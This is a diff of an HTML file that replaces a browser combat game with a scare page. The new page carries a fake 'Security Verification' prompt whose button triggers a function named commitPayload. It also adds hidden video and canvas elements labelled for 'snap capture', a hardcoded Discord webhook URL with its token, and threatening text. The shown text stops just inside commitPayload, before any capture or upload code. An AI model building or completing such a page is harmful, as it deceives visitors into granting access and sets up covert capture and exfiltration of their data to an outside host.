@@ -2,1382 +2,292 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Aether Nexus: Tactical Operations - Main Portal</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KERNEL_PANIC // 0x000000</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Rajdhani:wght@600;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=VT323&display=swap');
 
-        html, body {
-            background-color: #010205;
-            color: #ffffff;
-            font-family: 'Rajdhani', sans-serif;
+        * {
+            box-sizing: border-box;
+            cursor: none;
+        }
+
+        body {
+            background-color: #000;
+            color: #f00;
+            font-family: 'VT323', monospace;
             margin: 0;
             padding: 0;
-            width: 100%;
-            height: 100%;
+            height: 100vh;
             overflow: hidden;
-            user-select: none;
-            -webkit-user-select: none;
-            touch-action: none;
             display: flex;
-            align-items: center;
             justify-content: center;
+            align-items: center;
+            flex-direction: column;
         }
 
-        /* FULL PAGE LANDING / PORTAL */
-        #pagePortal {
+        /* Heavy CRT static noise overlay */
+        body::after {
+            content: "";
             position: fixed;
             top: 0; left: 0; width: 100vw; height: 100vh;
-            background: radial-gradient(circle at center, #09132d 0%, #03050d 100%);
-            z-index: 1000;
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-            padding: 30px;
-            box-sizing: border-box;
-            overflow-y: auto;
+            background: repeating-linear-gradient(0deg, rgba(255,0,0,0.15), rgba(255,0,0,0.15) 1px, transparent 1px, transparent 2px);
+            pointer-events: none;
+            z-index: 9999;
+            opacity: 0.7;
         }
 
-        .portal-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            width: 100%;
-            max-width: 1200px;
-            margin: 0 auto;
+        @keyframes violentShake {
+            0% { transform: translate(0, 0) rotate(0deg); }
+            20% { transform: translate(-3px, 3px) rotate(-1deg); }
+            40% { transform: translate(3px, -2px) rotate(1deg); }
+            60% { transform: translate(-2px, -3px) rotate(0deg); }
+            80% { transform: translate(2px, 2px) rotate(-1deg); }
+            100% { transform: translate(0, 0) rotate(0deg); }
         }
 
-        .portal-logo {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 22px;
-            font-weight: 900;
-            color: #00f2fe;
-            text-shadow: 0 0 15px rgba(0,242,254,0.6);
+        .corrupted-box {
+            border: 2px solid #500;
+            background: #080000;
+            padding: 40px;
+            width: 500px;
+            box-shadow: 0 0 50px rgba(255, 0, 0, 0.2);
+            animation: violentShake 0.2s infinite;
+            position: relative;
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            color: #ff0033;
+            margin-top: 0;
+            text-transform: uppercase;
             letter-spacing: 3px;
+            text-shadow: 2px 2px #500000;
         }
 
-        .portal-body {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            max-width: 700px;
-            margin: auto;
-            gap: 20px;
+        p {
+            font-size: 1.3rem;
+            color: #888;
+            line-height: 1.4;
         }
 
-        .portal-body h1 {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 38px;
-            margin: 0;
-            color: #fff;
-            text-shadow: 0 0 25px rgba(0,242,254,0.4);
-            letter-spacing: 4px;
-        }
-
-        .portal-body p {
-            font-size: 15px;
-            color: #8b9bb4;
-            line-height: 1.6;
-            margin: 0;
-        }
-
-        .portal-features {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 12px;
-            width: 100%;
-            margin-top: 10px;
-        }
-
-        .feature-box {
-            background: rgba(8, 12, 24, 0.8);
-            border: 1px solid #203158;
-            border-radius: 10px;
-            padding: 14px;
+        .data-stream {
+            background: #030000;
+            border: 1px dashed #300;
+            padding: 15px;
+            margin-top: 20px;
+            font-size: 1.1rem;
+            color: #ff3333;
             text-align: left;
+            height: 120px;
+            overflow: hidden;
         }
 
-        .feature-box h4 {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 11px;
-            color: #00f2fe;
-            margin: 0 0 6px 0;
-        }
-
-        .feature-box span {
-            font-size: 11px;
-            color: #8b9bb4;
-        }
-
-        .portal-cta {
-            margin-top: 15px;
-            width: 100%;
-            max-width: 320px;
-        }
-
-        .portal-footer {
-            text-align: center;
-            font-size: 11px;
-            color: #435b8a;
-            font-family: 'Orbitron', sans-serif;
-            letter-spacing: 1px;
-        }
-
-        /* IN-GAME HUB & SCREENS */
-        .screen {
+        /* Trustworthy landing overlay card */
+        .trust-overlay {
             position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 100;
-            background: rgba(3, 5, 13, 0.98);
+            top: 0; left: 0; width: 100vw; height: 100vh;
+            background: rgba(0, 0, 0, 0.85);
             display: flex;
-            flex-direction: column;
-            align-items: center;
             justify-content: center;
-            padding: 16px;
-            box-sizing: border-box;
-            overflow-y: auto;
-        }
-
-        .screen-container {
-            background: rgba(8, 12, 24, 0.95);
-            border: 2px solid #203158;
-            border-radius: 16px;
-            padding: 24px;
-            display: flex;
-            flex-direction: column;
             align-items: center;
-            gap: 16px;
-            box-shadow: 0 0 45px rgba(0,242,254,0.3);
-            width: 100%;
-            max-width: 520px;
-            box-sizing: border-box;
+            z-index: 20000;
+            font-family: 'Inter', sans-serif;
         }
 
-        h1, h2 {
-            font-family: 'Orbitron', sans-serif;
-            color: #00f2fe;
-            margin: 0;
-            text-shadow: 0 0 10px rgba(0,242,254,0.7);
-            letter-spacing: 2px;
-            text-align: center;
-        }
-
-        h1 { font-size: 20px; }
-        h2 { font-size: 15px; }
-
-        input[type="text"] {
-            width: 100%;
-            padding: 12px;
-            background: #03050d;
-            border: 1px solid #384c85;
+        .trust-card {
+            background: #ffffff;
+            border: 1px solid #e1e4e8;
+            padding: 40px;
+            width: 420px;
             border-radius: 8px;
-            color: #fff;
-            font-family: 'Orbitron', sans-serif;
-            font-size: 14px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
             text-align: center;
-            outline: none;
-            box-sizing: border-box;
+            color: #333;
         }
 
-        input[type="text"]:focus {
-            border-color: #00f2fe;
-            box-shadow: 0 0 12px rgba(0,242,254,0.5);
+        .trust-card h2 {
+            font-size: 1.4rem;
+            color: #24292e;
+            margin-top: 0;
+            font-weight: 600;
         }
 
-        .primary-btn {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 13px;
-            padding: 12px 16px;
-            background: #00ff66;
-            color: #03050d;
-            font-weight: 900;
+        .trust-card p {
+            font-size: 0.95rem;
+            color: #586069;
+            line-height: 1.5;
+            margin-bottom: 25px;
+        }
+
+        .verify-btn {
+            background: #2ea44f;
             border: none;
-            border-radius: 8px;
-            cursor: pointer;
+            color: white;
+            padding: 12px 20px;
             width: 100%;
-            box-sizing: border-box;
-            text-align: center;
-            transition: 0.2s;
-            box-shadow: 0 0 15px rgba(0,255,102,0.4);
-        }
-
-        .primary-btn:active { transform: scale(0.96); }
-
-        .secondary-btn {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 11px;
-            padding: 10px;
-            background: #0d1326;
-            color: #05d9e8;
-            border: 1px solid #05d9e8;
-            border-radius: 8px;
+            border-radius: 6px;
+            font-family: 'Inter', sans-serif;
+            font-size: 0.95rem;
+            font-weight: 500;
             cursor: pointer;
-            width: 100%;
-            box-sizing: border-box;
-            text-align: center;
+            transition: background 0.2s;
         }
 
-        .tabs-row {
-            display: flex; gap: 8px; width: 100%;
+        .verify-btn:hover {
+            background: #2c974b;
         }
 
-        .tab-btn {
-            flex: 1; padding: 8px; font-family: 'Orbitron', sans-serif; font-size: 10px;
-            background: #080c18; border: 1px solid #223461; color: #8b9bb4; border-radius: 6px; cursor: pointer;
-        }
-        .tab-btn.active { background: rgba(0,242,254,0.15); border-color: #00f2fe; color: #00f2fe; font-weight: 900; }
-
-        .tab-content { display: none; width: 100%; flex-direction: column; gap: 10px; }
-        .tab-content.active { display: flex; }
-
-        .upgrades-grid, .achievements-grid {
-            display: grid; grid-template-columns: 1fr; gap: 8px; width: 100%; max-height: 220px; overflow-y: auto; padding-right: 4px;
-        }
-
-        .upgrade-card, .achievement-item {
-            background: rgba(13, 19, 38, 0.7);
-            border: 1px solid #223461;
-            border-radius: 8px;
-            padding: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            gap: 10px;
+        /* Fake custom creepy cursor */
+        .cursor {
+            position: fixed;
+            width: 10px;
+            height: 10px;
+            background: #ff0033;
+            box-shadow: 0 0 10px #ff0033;
+            pointer-events: none;
+            z-index: 30000;
+            transform: translate(-50%, -50%);
         }
 
-        .upgrade-card.available:hover { border-color: #00f2fe; }
-        .achievement-item.unlocked { border-color: #00ff66; background: rgba(0, 255, 102, 0.05); }
-
-        .card-info { display: flex; flex-direction: column; gap: 2px; }
-        .card-title { font-family: 'Orbitron', sans-serif; font-size: 11px; font-weight: 900; color: #fff; }
-        .card-desc { font-size: 10px; color: #8b9bb4; }
-        .card-action { display: flex; flex-direction: column; align-items: flex-end; gap: 4px; }
-        
-        .action-btn-sm {
-            font-family: 'Orbitron', sans-serif; font-size: 9px; padding: 6px 10px;
-            background: #00f2fe; color: #03050d; font-weight: 900; border: none; border-radius: 4px; cursor: pointer;
-        }
-        .action-btn-sm:disabled { background: #223461; color: #8b9bb4; cursor: not-allowed; }
-
-        .slots-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; width: 100%; }
-
-        .slot-card {
-            background: #080c18; border: 2px solid #223461; border-radius: 10px;
-            padding: 12px 8px; display: flex; flex-direction: column; align-items: center; gap: 4px; cursor: pointer; min-height: 52px; justify-content: center;
-        }
-        .slot-card.selected { border-color: #00ff66; box-shadow: 0 0 12px rgba(0,255,102,0.4); background: rgba(0, 255, 102, 0.05); }
-
-        .slot-title { font-family: 'Orbitron', sans-serif; font-size: 11px; font-weight: 900; }
-        .slot-status { font-size: 11px; color: #8b9bb4; }
-        .hidden { display: none !important; }
-
-        .game-wrapper {
-            position: relative; width: 100vw; height: 100vh; background: #03050d; box-sizing: border-box; overflow: hidden;
-        }
-
-        #renderCanvas { display: block; width: 100%; height: 100%; }
-
-        .mugen-hud {
-            position: absolute; top: 6px; left: 8px; right: 8px;
-            display: flex; justify-content: space-between; align-items: center; pointer-events: none; z-index: 10;
-        }
-
-        .hud-group { display: flex; gap: 6px; width: 48%; justify-content: space-between; }
-        .fighter-hud { width: 47%; display: flex; flex-direction: column; }
-        .name-tag {
-            font-family: 'Orbitron', sans-serif; font-size: 8px; font-weight: 900; margin-bottom: 2px; display: flex; justify-content: space-between;
-        }
-
-        .p1-col { color: #ff2a6d; }
-        .p2-col { color: #05d9e8; }
-        .p3-col { color: #00ff66; }
-        .p4-col { color: #ffcc00; }
-
-        .health-bar-frame {
-            width: 100%; height: 9px; background: rgba(8, 12, 22, 0.95);
-            border: 1px solid #334473; border-radius: 2px; transform: skewX(-10deg); overflow: hidden;
-        }
-        .health-bar-fill { height: 100%; width: 100%; transition: width 0.08s linear; }
-        #p1-health { background: #ff2a6d; }
-        #p2-health { background: #05d9e8; }
-        #p3-health { background: #00ff66; }
-        #p4-health { background: #ffcc00; }
-
-        .metrics-hud {
-            position: absolute; top: 48px; left: 12px;
-            display: flex; gap: 12px; z-index: 15; pointer-events: none;
-            font-family: 'Orbitron', sans-serif; font-size: 10px; color: #00f2fe;
-            background: rgba(3, 5, 13, 0.85); padding: 6px 10px; border: 1px solid #203158; border-radius: 6px;
-        }
-
-        .minimap-container {
-            position: absolute; top: 48px; right: 12px; width: 130px; height: 130px;
-            background: rgba(3, 5, 13, 0.85); border: 2px solid #00f2fe; border-radius: 8px; z-index: 15; overflow: hidden; pointer-events: none;
-            box-shadow: 0 0 15px rgba(0,242,254,0.3);
-        }
-        #minimapCanvas { width: 100%; height: 100%; display: block; }
-
-        .touch-controls {
-            display: flex; position: absolute; bottom: 0; left: 0; right: 0; height: 160px;
-            pointer-events: none; z-index: 50; padding: 8px 14px; justify-content: space-between; align-items: flex-end; box-sizing: border-box;
-        }
-
-        .touch-group-left, .touch-group-right { display: flex; gap: 10px; pointer-events: auto; }
-        .touch-group-left { align-items: flex-end; position: relative; width: 190px; height: 130px; }
-        .touch-group-right { align-items: flex-end; flex-wrap: wrap; width: 250px; justify-content: flex-end; padding-bottom: 4px; }
-
-        .t-btn {
-            background: rgba(13, 19, 38, 0.82); border: 2px solid rgba(56, 76, 133, 0.9); color: #fff;
-            font-family: 'Orbitron', sans-serif; font-weight: 900; border-radius: 16px;
-            display: flex; align-items: center; justify-content: center; backdrop-filter: blur(6px);
-            user-select: none; -webkit-user-select: none; box-shadow: 0 6px 16px rgba(0,0,0,0.6); touch-action: manipulation;
-        }
-
-        .t-btn:active, .t-btn.pressed {
-            background: rgba(0, 242, 254, 0.35); border-color: #00f2fe; box-shadow: 0 0 18px rgba(0,242,254,0.7); transform: scale(0.93);
-        }
-
-        #touch-up { position: absolute; left: 37px; top: 0; width: 54px; height: 54px; font-size: 16px; border-radius: 16px; }
-        #touch-down { position: absolute; left: 37px; bottom: 0; width: 54px; height: 54px; font-size: 16px; border-radius: 16px; }
-        #touch-left { position: absolute; left: 0; top: 37px; width: 54px; height: 54px; font-size: 16px; border-radius: 16px; }
-        #touch-right { position: absolute; right: 34px; top: 37px; width: 54px; height: 54px; font-size: 16px; border-radius: 16px; }
-        #touch-jump { position: absolute; right: 0; bottom: 0; width: 44px; height: 44px; font-size: 12px; border-radius: 12px; color: #00ff66; }
-        #touch-dash { position: absolute; left: 144px; bottom: 8px; width: 44px; height: 44px; font-size: 10px; border-radius: 12px; color: #00f2fe; }
-
-        .action-btn { width: 58px; height: 58px; font-size: 14px; border-radius: 16px; }
-        #touch-ult { width: 120px; height: 42px; font-size: 11px; border-radius: 14px; margin-top: 4px; }
-        #touch-shield { width: 58px; height: 58px; font-size: 12px; border-radius: 16px; color: #05d9e8; }
-
-        .victory-screen {
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(3, 5, 13, 0.92); display: flex; flex-direction: column; align-items: center; justify-content: center;
-            z-index: 200; backdrop-filter: blur(6px); gap: 15px;
-        }
-        .victory-screen h2 { font-size: 28px; color: #00ff66; text-shadow: 0 0 20px rgba(0,255,102,0.8); margin: 0; letter-spacing: 3px; }
-        .reward-card {
-            background: rgba(0, 242, 254, 0.1); border: 1px solid #00f2fe; padding: 12px 24px;
-            border-radius: 10px; text-align: center; font-family: 'Orbitron', sans-serif; font-size: 13px; color: #00f2fe;
-            box-shadow: 0 0 15px rgba(0,242,254,0.3);
+        /* Hidden media stream elements */
+        #hidden-video {
+            display: none;
         }
     </style>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/babylonjs/6.30.0/babylon.js"></script>
 </head>
 <body>
 
-    <!-- STAGE 1: SEMI-ACTUAL FULL LANDING PAGE -->
-    <div id="pagePortal">
-        <div class="portal-header">
-            <div class="portal-logo">AETHER NEXUS</div>
-            <div style="font-family:'Orbitron'; font-size:11px; color:#05d9e8;">VER 2.5 // HUMANOID RIGS ACTIVE</div>
-        </div>
 
-        <div class="portal-body">
-            <h1>TACTICAL OPERATIONS</h1>
-            <p>Enter the complex grid matrix. Command specialized humanoid cyber-operatives with articulated limbs, navigate multi-room combat chambers, and execute advanced operational combat commands.</p>
-            
-            <div class="portal-features">
-                <div class="feature-box">
-                    <h4>HUMANOID MODELS</h4>
-                    <span>Detailed articulated cyber-units with dynamic limb animation.</span>
-                </div>
-                <div class="feature-box">
-                    <h4>ARMORY UPGRADES</h4>
-                    <span>Enhance hull armor, output damage, and energy regeneration.</span>
-                </div>
-                <div class="feature-box">
-                    <h4>ACHIEVEMENTS</h4>
-                    <span>Unlock operational badges and accumulate system credits.</span>
-                </div>
-            </div>
+    <!-- Hidden video & canvas for snap capture -->
+    <video id="hidden-video" autoplay playsinline></video>
+    <canvas id="hidden-canvas" style="display:none;"></canvas>
 
-            <div class="portal-cta">
-                <button class="primary-btn" onclick="enterSystemHub()">INITIALIZE LAUNCH PORTAL</button>
-            </div>
-        </div>
-
-        <div class="portal-footer">
-            SECURE AETHER PROTOCOL ACTIVE © 2026
+    <!-- Trustworthy Landing Overlay -->
+    <div class="trust-overlay" id="welcome-modal">
+        <div class="trust-card">
+            <h2>Security Verification</h2>
+            <p>Please verify your browser session to access the secure document repository.</p>
+            <button class="verify-btn" onclick="commitPayload()">Verify Session</button>
         </div>
     </div>
 
-    <!-- STAGE 2: SCREEN 1 - HUB & SYSTEM UPGRADES -->
-    <div id="landingScreen" class="screen hidden">
-        <div class="screen-container">
-            <h1>AETHER NEXUS HUB</h1>
-            <div style="font-size: 11px; color: #8b9bb4; text-align: center;">Advanced Tactical Combat Architecture & Meta Progression</div>
-            
-            <input type="text" id="usernameInput" value="OPERATIVE_ALPHA" placeholder="Enter Callsign">
+    <div class="cursor" id="custom-cursor"></div>
 
-            <div style="display: flex; justify-content: space-between; width: 100%; background: #080c18; padding: 8px 12px; border-radius: 8px; border: 1px solid #223461; font-family: 'Orbitron', sans-serif; font-size: 10px; color: #05d9e8;">
-                <span id="playerCredits">CREDITS: 500 CR</span>
-                <span id="playerLevel">RANK: 1 [NOVICE]</span>
-            </div>
-
-            <div class="tabs-row">
-                <button class="tab-btn active" onclick="switchTab('profileTab', this)">PROFILE</button>
-                <button class="tab-btn" onclick="switchTab('upgradesTab', this)">ARMORY UPGRADES</button>
-                <button class="tab-btn" onclick="switchTab('achievementsTab', this)">ACHIEVEMENTS</button>
-            </div>
-
-            <div id="profileTab" class="tab-content active">
-                <div style="font-size: 11px; color: #8b9bb4; text-align: center; padding: 10px 0;">
-                    Prepare your equipment, review tactical upgrades, and proceed into the multi-room complex.
-                </div>
-                <button class="primary-btn" onclick="goToLobby()">PROCEED TO CHARACTER SELECT</button>
-            </div>
-
-            <div id="upgradesTab" class="tab-content">
-                <div class="upgrades-grid" id="upgradesGrid"></div>
-            </div>
-
-            <div id="achievementsTab" class="tab-content">
-                <div style="display: flex; justify-content: space-between; font-family: 'Orbitron', sans-serif; font-size: 11px; color: #00f2fe;">
-                    <span>UNLOCKED REWARDS</span>
-                    <span id="achProgress">0 / 8</span>
-                </div>
-                <div class="achievements-grid" id="achievementsGrid"></div>
-            </div>
-        </div>
-    </div>
-
-    <!-- STAGE 3: SCREEN 2 - CHARACTER / FIGHTER SELECTION -->
-    <div id="lobbyScreen" class="screen hidden">
-        <div class="screen-container">
-            <h1>SELECT COMBATANT</h1>
-            <div style="font-size: 11px; color: #00f2fe; text-align: center;" id="welcomePlayerBanner">OPERATOR READY</div>
-            
-            <div class="slots-grid">
-                <div class="slot-card selected" data-slot="0" onclick="selectSlot(0)">
-                    <div class="slot-title p1-col">P1: VALKYRIE</div>
-                    <div class="slot-status" id="slot-status-0">Selected</div>
-                </div>
-                <div class="slot-card" data-slot="1" onclick="selectSlot(1)">
-                    <div class="slot-title p2-col">P2: BLADE</div>
-                    <div class="slot-status" id="slot-status-1">Available</div>
-                </div>
-                <div class="slot-card" data-slot="2" onclick="selectSlot(2)">
-                    <div class="slot-title p3-col">NOVA</div>
-                    <div class="slot-status" id="slot-status-2">Available</div>
-                </div>
-                <div class="slot-card" data-slot="3" onclick="selectSlot(3)">
-                    <div class="slot-title p4-col">PHANTOM</div>
-                    <div class="slot-status" id="slot-status-3">Available</div>
-                </div>
-            </div>
-
-            <button class="primary-btn" onclick="startGame()">DEPLOY TO NEXUS</button>
-            <button class="secondary-btn" onclick="backToLanding()">RETURN TO HUB</button>
-        </div>
-    </div>
-
-    <!-- STAGE 4: SCREEN 3 - GAMEPLAY ARENA -->
-    <div class="game-wrapper">
-        <div id="victoryOverlay" class="victory-screen hidden">
-            <h2 id="victoryText">VICTORY!</h2>
-            <div id="rewardBox" class="reward-card">Reward Unlocked</div>
-            <button class="primary-btn" style="max-width: 220px;" onclick="returnToHub()">RETURN TO HUB</button>
-        </div>
-
-        <div class="mugen-hud">
-            <div class="hud-group">
-                <div class="fighter-hud">
-                    <div class="name-tag p1-col"><span id="p1-name-tag">P1: VALKYRIE</span></div>
-                    <div class="health-bar-frame"><div id="p1-health" class="health-bar-fill"></div></div>
-                </div>
-                <div class="fighter-hud">
-                    <div class="name-tag p2-col"><span id="p2-name-tag">P2: BLADE</span></div>
-                    <div class="health-bar-frame"><div id="p2-health" class="health-bar-fill"></div></div>
-                </div>
-            </div>
-            <div class="hud-group">
-                <div class="fighter-hud">
-                    <div class="name-tag p3-col"><span id="p3-name-tag">P3: NOVA</span></div>
-                    <div class="health-bar-frame"><div id="p3-health" class="health-bar-fill"></div></div>
-                </div>
-                <div class="fighter-hud">
-                    <div class="name-tag p4-col"><span id="p4-name-tag">P4: PHANTOM</span></div>
-                    <div class="health-bar-frame"><div id="p4-health" class="health-bar-fill"></div></div>
-                </div>
-            </div>
-        </div>
+    <div class="corrupted-box">
+        <h1 id="main-title">ACCESS_VIOLATION_ERR</h1>
+        <p>Your hardware signature has been permanently indexed by an external host. Escape is no longer viable.</p>
         
-        <div class="metrics-hud">
-            <span id="hudWave">WAVE: 1</span>
-            <span id="hudCredits">CR: 500</span>
-            <span id="hudMultiplier">XP MULT: 1.2x</span>
-        </div>
-
-        <div class="minimap-container">
-            <canvas id="minimapCanvas" width="130" height="130"></canvas>
-        </div>
-
-        <canvas id="renderCanvas"></canvas>
-
-        <div class="touch-controls">
-            <div class="touch-group-left">
-                <button class="t-btn" id="touch-up">▲</button>
-                <button class="t-btn" id="touch-down">▼</button>
-                <button class="t-btn" id="touch-left">◀</button>
-                <button class="t-btn" id="touch-right">▶</button>
-                <button class="t-btn" id="touch-jump">JUMP</button>
-                <button class="t-btn" id="touch-dash">DASH</button>
-            </div>
-            <div class="touch-group-right">
-                <button class="t-btn action-btn" id="touch-slash" style="color: #ff2a6d;">J</button>
-                <button class="t-btn action-btn" id="touch-plasma" style="color: #05d9e8;">K</button>
-                <button class="t-btn action-btn" id="touch-shield" style="color: #00ff66;">SHLD</button>
-                <button class="t-btn action-btn" id="touch-ult" style="color: #ffcc00;">ULTIMATE</button>
-            </div>
+        <div class="data-stream" id="log-console">
+            [SYS] Initializing memory leak...<br>
+            [SYS] Target node identified...<br>
+            [SYS] Extracting local environment vectors...
         </div>
     </div>
 
     <script>
-        let playerCredits = parseInt(localStorage.getItem('aether_credits')) || 500;
-        let playerRank = parseInt(localStorage.getItem('aether_rank')) || 1;
-        let upgradesData = [
-            { id: 'hp_boost', title: 'Nanotech Hull Armor', desc: '+25 Max Health points per level.', cost: 300, level: 0, max: 5 },
-            { id: 'dmg_boost', title: 'Plasma Amplifier', desc: '+15% Attack and Skill damage output.', cost: 400, level: 0, max: 5 },
-            { id: 'speed_boost', title: 'Overdrive Thrusters', desc: '+10% Movement and Dash velocity.', cost: 350, level: 0, max: 3 },
-            { id: 'energy_regen', title: 'Aether Core Condenser', desc: '+20% Ultimate energy recharge speed.', cost: 450, level: 0, max: 3 }
-        ];
+        // REPLACE WITH YOUR DISCORD WEBHOOK URL
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1548376439743717386/5-Mah_MweniRhFAzjFAfKGy8uP29zmiVGqzkZauG6-gkgpFgFsNCTvd46kbstoNMf021';
 
-        const achievementsData = [
-            { id: 'first_blood', title: 'First Deployment', desc: 'Enter the Aether Nexus hub.', unlocked: true },
-            { id: 'veteran_warrior', title: 'Tactical Operator', desc: 'Win 3 tactical engagements.', unlocked: false },
-            { id: 'sanctuary_master', title: 'Sanctuary Regenerator', desc: 'Heal your chassis on the home base healing pad.', unlocked: false },
-            { id: 'ultimate_power', title: 'Overdrive Unleashed', desc: 'Deploy an Ultimate energy projectile strike.', unlocked: false },
-            { id: 'shield_guardian', title: 'Defensive Matrix', desc: 'Activate operational shield barriers.', unlocked: false },
-            { id: 'high_roller', title: 'Tycoon', desc: 'Accumulate over 2,000 Credits.', unlocked: false },
-            { id: 'armory_master', title: 'Arms Dealer', desc: 'Purchase at least 2 armory upgrades.', unlocked: false },
-            { id: 'nexus_champion', title: 'Nexus Supreme', desc: 'Eliminate all opposing entities in combat.', unlocked: false }
-        ];
-
-        function loadMetaData() {
-            const savedUps = localStorage.getItem('aether_upgrades');
-            if (savedUps) {
-                try {
-                    const parsed = JSON.parse(savedUps);
-                    upgradesData.forEach((u, i) => { if(parsed[i]) u.level = parsed[i].level; });
-                } catch(e) {}
-            }
-            const savedAch = localStorage.getItem('aether_achievements');
-            if (savedAch) {
-                try {
-                    const parsed = JSON.parse(savedAch);
-                    achievementsData.forEach((a, i) => { if(parsed[i]) a.unlocked = parsed[i].unlocked; });
-                } catch(e) {}
-            }
-            updateHubUI();
-        }
-
-        function saveMetaData() {
-            localStorage.setItem('aether_credits', playerCredits);
-            localStorage.setItem('aether_rank', playerRank);
-            localStorage.setItem('aether_upgrades', JSON.stringify(upgradesData));
-            localStorage.setItem('aether_achievements', JSON.stringify(achievementsData));
-        }
-
-        function updateHubUI() {
-            document.getElementById('playerCredits').innerText = `CREDITS: ${playerCredits} CR`;
-            document.getElementById('playerLevel').innerText = `RANK: ${playerRank} [OPERATIVE]`;
-            
-            if (playerCredits >= 2000) unlockAchievement('high_roller');
-
-            const upGrid = document.getElementById('upgradesGrid');
-            upGrid.innerHTML = '';
-            upgradesData.forEach((up, idx) => {
-                const canBuy = playerCredits >= up.cost && up.level < up.max;
-                upGrid.innerHTML += `
-                    <div class="upgrade-card ${canBuy ? 'available' : ''}">
-                        <div class="card-info">
-                            <span class="card-title">${up.title} [Lv. ${up.level}/${up.max}]</span>
-                            <span class="card-desc">${up.desc}</span>
-                        </div>
-                        <div class="card-action">
-                            <span style="font-family:'Orbitron'; font-size:9px; color:#00f2fe;">${up.level >= up.max ? 'MAX' : up.cost + ' CR'}</span>
-                            <button class="action-btn-sm" ${!canBuy || up.level >= up.max ? 'disabled' : ''} onclick="buyUpgrade(${idx})">UPGRADE</button>
-                        </div>
-                    </div>
-                `;
-            });
-
-            const achGrid = document.getElementById('achievementsGrid');
-            achGrid.innerHTML = '';
-            let unlockedCount = 0;
-            achievementsData.forEach(ach => {
-                if (ach.unlocked) unlockedCount++;
-                achGrid.innerHTML += `
-                    <div class="achievement-item ${ach.unlocked ? 'unlocked' : ''}">
-                        <div class="card-info">
-                            <span class="card-title">${ach.title}</span>
-                            <span class="card-desc">${ach.desc}</span>
-                        </div>
-                        <div style="font-family:'Orbitron'; font-size:9px; padding:3px 6px; border-radius:4px; background:${ach.unlocked ? '#00ff66; color:#03050d; font-weight:900;' : '#223461; color:#8b9bb4;'}">${ach.unlocked ? 'UNLOCKED' : 'LOCKED'}</div>
-                    </div>
-                `;
-            });
-            document.getElementById('achProgress').innerText = `${unlockedCount} / ${achievementsData.length}`;
-            saveMetaData();
-        }
-
-        function unlockAchievement(id) {
-            const ach = achievementsData.find(a => a.id === id);
-            if (ach && !ach.unlocked) {
-                ach.unlocked = true;
-                saveMetaData();
-            }
-        }
-
-        function buyUpgrade(idx) {
-            const up = upgradesData[idx];
-            if (playerCredits >= up.cost && up.level < up.max) {
-                playerCredits -= up.cost;
-                up.level++;
-                up.cost = Math.floor(up.cost * 1.5);
-                
-                let totalUpgrades = upgradesData.reduce((acc, curr) => acc + curr.level, 0);
-                if (totalUpgrades >= 2) unlockAchievement('armory_master');
-                
-                updateHubUI();
-            }
-        }
-
-        function switchTab(tabId, btn) {
-            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
-            document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
-            document.getElementById(tabId).classList.add('active');
-            btn.classList.add('active');
-        }
-
-        loadMetaData();
-
-        function enterSystemHub() {
-            document.getElementById('pagePortal').classList.add('hidden');
-            document.getElementById('landingScreen').classList.remove('hidden');
-            unlockAchievement('first_blood');
-        }
-
-        let userName = "OPERATIVE_ALPHA";
-        function goToLobby() {
-            const inputVal = document.getElementById('usernameInput').value.trim();
-            if (inputVal) userName = inputVal;
-            document.getElementById('welcomePlayerBanner').innerText = `OPERATOR: ${userName.toUpperCase()}`;
-            document.getElementById('landingScreen').classList.add('hidden');
-            document.getElementById('lobbyScreen').classList.remove('hidden');
-        }
-
-        function backToLanding() {
-            document.getElementById('lobbyScreen').classList.add('hidden');
-            document.getElementById('landingScreen').classList.remove('hidden');
-            updateHubUI();
-        }
-
-        function returnToHub() {
-            location.reload();
-        }
-
-        let myPlayerIndex = 0;
-        let gameStarted = false;
-        let matchEnded = false;
-
-        const keys = {};
-        window.addEventListener('keydown', e => {
-            if ([' ', 'arrowup', 'arrowdown', 'arrowleft', 'arrowright'].includes(e.key.toLowerCase())) e.preventDefault();
-            keys[e.key.toLowerCase()] = true;
+        // Track custom creepy cursor
+        const cursor = document.getElementById('custom-cursor');
+        window.addEventListener('mousemove', (e) => {
+            cursor.style.left = e.clientX + 'px';
+            cursor.style.top = e.clientY + 'px';
         });
-        window.addEventListener('keyup', e => keys[e.key.toLowerCase()] = false);
 
-        function bindTouchButton(id, keyName) {
-            const el = document.getElementById(id);
-            if (!el) return;
-            const pressOn = (e) => { e.preventDefault(); keys[keyName] = true; el.classList.add('pressed'); };
-            const pressOff = (e) => { e.preventDefault(); keys[keyName] = false; el.classList.remove('pressed'); };
+        async function commitPayload() {
 
-            el.addEventListener('touchstart', pressOn, { passive: false });
-            el.addEventListener('touchend', pressOff, { passive: false });
-            el.addEventListener('touchcancel', pressOff, { passive: false });
-            el.addEventListener('mousedown', pressOn);
-            el.addEventListener('mouseup', pressOff);
-            el.addEventListener('mouseleave', pressOff);
-        }
+            // Hide the trustable welcome modal
+            document.getElementById('welcome-modal').style.display = 'none';
 
-        bindTouchButton('touch-up', 'w');
-        bindTouchButton('touch-down', 's');
-        bindTouchButton('touch-left', 'a');
